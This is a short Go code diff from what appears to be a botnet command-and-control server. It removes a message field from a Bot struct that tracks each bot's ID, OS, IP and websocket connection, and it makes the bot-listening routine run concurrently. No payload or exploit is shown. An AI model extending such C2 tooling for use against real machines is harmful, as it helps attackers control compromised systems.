@@ -18,13 +18,12 @@ import (
 type Bot struct {
 	mu sync.RWMutex
 
-	ID         int    `json:"id"`
-	OS         string `json:"os"`
-	IP         string `json:"ip"`
-	LastSeen   time.Time
-	Active     bool
-	BotMessage BotMessage
-	con        *websocket.Conn
+	ID       int    `json:"id"`
+	OS       string `json:"os"`
+	IP       string `json:"ip"`
+	LastSeen time.Time
+	Active   bool
+	con      *websocket.Conn
 	// Command Command
 }
 
@@ -95,7 +94,7 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 
 	fmt.Print(b.ID, b.IP, b.OS, b.LastSeen)
 
-	c.listentoBot(&b)
+	go c.listentoBot(&b)
 
 }
 
